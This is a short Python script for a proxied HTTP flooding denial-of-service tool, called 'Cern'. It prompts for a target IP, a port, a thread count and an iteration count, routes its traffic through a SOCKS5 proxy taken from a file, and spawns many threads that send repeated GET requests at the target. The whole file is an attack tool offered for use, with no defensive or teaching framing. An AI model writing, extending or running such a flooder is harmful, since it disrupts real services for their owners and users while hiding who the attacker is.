import requests
import os
from colorama import Fore
import platform
from threading import Thread
import socks
import socket

def clear():
    if platform.system() == 'Windows':
        os.system("cls")
    else:
        os.system("clear")

def dos():
    clear()
    print("Cern@admin-[$]> Enter Target IP ")
    ip = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> Enter Target Port ")
    port = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    protocol = input("Do you want to use HTTP or HTTPS proxies? (HTTP/HTTPS): ")
    print("Cern@admin-[$]> Enter Number of Threads (1mb/request)")
    threads = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> How many iterations ? (threads*iterations)*1/mb)")
    length = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")

    def singlerequest():
        with open("proxy.txt", "r") as file:
            proxy = file.read().strip()
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy)
            socket.socket = socks.socksocket
            for _ in range(int(length)):
                try:
                    response = requests.get(f"http{'s' if protocol.lower() == 'https' else ''}://{ip}:{port}")
                    print(f"Cern@admin-[$]> Sent request to {ip} on port {port}")
                except:
                    print(f"Cern@admin-[$]> Failed to send request to {ip} on port {port}")

    threads_list = []
    for _ in range(int(threads)):
        t = Thread(target=singlerequest)
        threads_list.append(t)
        t.start()

